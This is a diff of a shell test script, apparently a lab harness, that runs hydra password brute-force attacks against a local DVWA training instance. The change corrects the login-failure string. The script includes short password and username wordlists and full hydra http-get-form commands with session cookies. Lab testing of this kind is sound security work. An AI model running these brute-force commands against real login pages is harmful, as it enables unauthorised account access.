@@ -556,7 +556,7 @@ fi
 echo -e "password\n123456\nadmin\nletmein\nqwerty\ntest\ntest123\npassw0rd\niloveyou\nwelcome" > /tmp/hydra_test.txt
 hydra_test=$(timeout 20 hydra -l admin -P /tmp/hydra_test.txt -f \
   "localhost" -s "$DVWA_PORT" \
-  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Login failed:H=Cookie\:PHPSESSID=$SESSID7;security=low" \
+  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie\:PHPSESSID=$SESSID7;security=low" \
   2>&1)
 if echo "$hydra_test" | grep -q "password\|successfully\|found"; then
   RESULTS+="| L7-03 | hydra admin:password (10 mots) | ✅ | mot de passe trouvé | admin:password | |\n"
@@ -572,7 +572,7 @@ echo -e "admin\ngordonb\n1337\npablo\nsmithy" > /tmp/hydra_users.txt
 echo -e "password\n123456\nadmin\nletmein" > /tmp/hydra_pass.txt
 hydra_multi=$(timeout 20 hydra -L /tmp/hydra_users.txt -P /tmp/hydra_pass.txt -f \
   "localhost" -s "$DVWA_PORT" \
-  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Login failed:H=Cookie\:PHPSESSID=$SESSID7;security=low" \
+  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie\:PHPSESSID=$SESSID7;security=low" \
   2>&1)
 if echo "$hydra_multi" | grep -q "password\|successfully\|found\|victim"; then
   RESULTS+="| L7-04 | hydra multi-users (-L) | ✅ | identifiants trouvés | admin:password | |\n"
